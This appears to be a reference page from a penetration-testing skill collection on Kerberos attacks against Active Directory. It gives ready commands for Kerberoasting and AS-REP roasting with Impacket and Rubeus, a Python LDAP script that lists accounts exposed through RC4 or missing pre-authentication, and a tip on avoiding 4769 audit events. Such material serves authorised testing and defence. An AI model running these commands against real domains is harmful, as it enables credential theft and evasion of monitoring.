# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-kerberos-attacks`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `impacket-GetUserSPNs` | `impacket-GetUserSPNs corp.example/lowpriv:pass -dc-ip 10.20.30.10 -request -outputfile tgs.txt` | Service-ticket request for SPN accounts | Linux / Windows |
| `impacket-GetNPUsers` | `impacket-GetNPUsers corp.example/ -usersfile users.txt -dc-ip 10.20.30.10 -format hashcat` | AS-REP request for pre-auth-disabled accounts | Linux / Windows |
| `Rubeus` | `Rubeus.exe kerberoast /outfile:tgs.txt /nowrap` | Service-ticket request from a Windows host | Windows |
| `Get-ADUser` | `Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes` | Encryption-type baseline per account | Windows |
| `klist` | `klist -e` | Current ticket cache with encryption types, the client-side view | Windows |

## Minimal Lab Validation Script

Compute the exploitable set from directory attributes alone; no ticket request is needed to state which accounts are exposed.

```python
from ldap3 import Server, Connection, NTLM

RC4_BIT = 0x4
DONT_REQ_PREAUTH = 0x400000
srv = Server("10.20.30.10")
conn = Connection(srv, user="CORP\\lowpriv", password="pass", authentication=NTLM, auto_bind=True)
conn.search("DC=corp,DC=example", "(&(objectClass=user)(servicePrincipalName=*))",
            attributes=["sAMAccountName", "msDS-SupportedEncryptionTypes", "userAccountControl"])
for e in conn.entries:
    etypes = int(e.msDS_SupportedEncryptionTypes.value or 0)
    uac = int(e.userAccountControl.value or 0)
    print(e.sAMAccountName, "rc4_permitted", bool(etypes & RC4_BIT),
          "preauth_not_required", bool(uac & DONT_REQ_PREAUTH))
```

## Flag Notes

- `-request` fetches the ticket; omit it to enumerate without generating 4769 events.
- `-format hashcat` emits mode-compatible output, which keeps cracking evidence reproducible.
- `klist -e` shows the encryption type of cached tickets without touching the network.
